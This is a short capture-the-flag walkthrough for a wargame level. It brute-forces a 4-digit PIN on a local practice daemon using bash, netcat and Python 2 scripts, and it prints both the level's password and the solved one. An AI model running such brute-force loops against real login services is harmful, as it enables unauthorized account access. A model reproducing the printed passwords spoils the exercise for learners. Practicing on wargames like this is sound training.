Level Goal: "A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing."

I did a simple bash script to bruteforce first, but I found it painfully slow, and I could not find a way to speed it up at first. This was the initial script:

```bash
#!/bin/bash
PASS="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for i in {0001..9999}; do
    RESPONSE=$(echo $PASS $i | nc localhost 30002)
    echo Checking $i
    if [[ $RESPONSE != *"Wrong"* ]]; then
      echo $RESPONSE
    fi
done
```

Then I tried to do Python, but it seems to disconnect on random timer, as I fiddled with time.sleep for a while and kept getting disconnected, regardless of how slow it was.

```python
import socket
import time

password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

for i in range (0, 10000):
        num = "%04d" % (i)
        print num
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('localhost', 30002))
        s.sendall(password + " " + num)
        recv = s.recv(1024)
        if "I am the pincode checker for user bandit25." not in recv:
                print recv
        s.close()
        time.sleep(0.15)

print "Program finished executing."
```

After doing a bit of reading, I found that I could speed up the requests significantly by transmitting every possible combination to the server at once, rather than one request at a time. To do so, I made a file named `dictgen.sh` containing the following script:
```bash
#!/bin/bash
PASS='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
for i in {0001..9999}; do
	echo $PASS $i >> dict.txt
done
```

Now I just had to pass the dict.txt file to the server via nc like so `cat dict.txt | nc localhost 30002`.

Password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
